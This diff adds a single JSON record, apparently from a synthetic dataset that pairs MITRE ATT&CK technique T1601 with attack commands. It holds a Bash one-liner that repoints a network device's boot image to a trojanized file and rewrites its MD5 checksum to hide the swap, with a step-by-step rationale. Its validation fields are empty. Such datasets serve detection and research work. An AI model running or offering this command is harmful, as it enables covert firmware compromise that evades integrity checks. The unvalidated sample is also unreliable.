@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "ln -sf /bootflash/trojan.img /bootflash/active.img && sync && md5sum /bootflash/active.img > /etc/firmware/active.img.md5",
+  "explanation": "Redirects the boot image symlink to a malicious image and updates its checksum file to mask the redirection.",
+  "rationale_steps": [
+    "Change the symlink target to point at the trojanized image",
+    "Flush filesystem metadata updates",
+    "Recompute and store MD5 to fit the new target image"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-3f5b9fd2-c6e10e24",
+  "source_prompt_hash": "3f5b9fd2",
+  "timestamp_utc": "2025-09-30T04:34:26.844102Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
